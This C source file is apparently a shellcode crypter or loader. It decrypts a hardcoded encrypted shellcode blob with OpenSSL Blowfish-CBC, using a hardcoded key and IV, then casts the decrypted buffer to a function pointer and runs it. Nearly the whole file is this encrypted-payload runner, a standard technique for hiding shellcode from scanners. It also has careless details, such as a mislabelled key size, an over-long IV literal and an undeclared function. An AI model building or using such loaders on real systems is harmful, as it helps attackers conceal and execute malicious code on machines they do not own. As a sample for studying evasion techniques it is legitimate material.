#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void print_shellcode(unsigned char *shellcode) {
    size_t len = strlen(shellcode);
    int i;

    for (i = 0; i < len; i++) {
        printf("\\x%02x", *(shellcode + i));
    }

    printf("\n\n");
}

int main(int argc, char *argv[]) {
    // 256 bit key
    unsigned char *key = "4a9014eb30e5da0a8ea427b662f1cd3d";

    // 128 bit IV
    unsigned char *iv = "01234567890123456";

    // Encrypted shellcode
    unsigned char *encrypted_shellcode =
                                "\x34\xcb\x6e\x8f\x8d\x2b\xc0" 
                                "\x16\x1e\xff\x12\x42\x58\x38"
                                "\x91\x38\x23\xb6\x5f\x3a\xfc"
                                "\x25\x11\x90\xed\xe6\xbc\x01"
                                "\x0f\xc6\xbf\x41";

    // Buffer for the decrypted text
    unsigned char decrypted_shellcode[128];

    int decrypted_len;

    // Initialize the library
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    OPENSSL_config(NULL);

    // Decrypt the ciphertext
    decrypted_len = decrypt(encrypted_shellcode, 32, key, iv,
                            decrypted_shellcode);

    decrypted_shellcode[decrypted_len] = '\0';

    printf("Decrypted text is:\n");
    print_shellcode(decrypted_shellcode);

    // Execute decrypted shellcode
    printf("Executing shellcode...\n");
    printf("Shellcode Length:  %d\n", strlen(decrypted_shellcode));
    int (*ret)() = (int(*)())decrypted_shellcode;
    ret();

    // Cleanup
    EVP_cleanup();
    ERR_free_strings();

    return 0;
}

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
    unsigned char *iv, unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    // Create context
    if (! (ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // Initialize decryption
    if (EVP_DecryptInit_ex(ctx, EVP_bf_cbc(), NULL, key, iv) != 1) {
        handleErrors();
    }

    // Decrypt the message
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1) {
        handleErrors();
    }

    plaintext_len = len;

    // Finalize decryption
    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        handleErrors();
    }

    plaintext_len += len;

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}
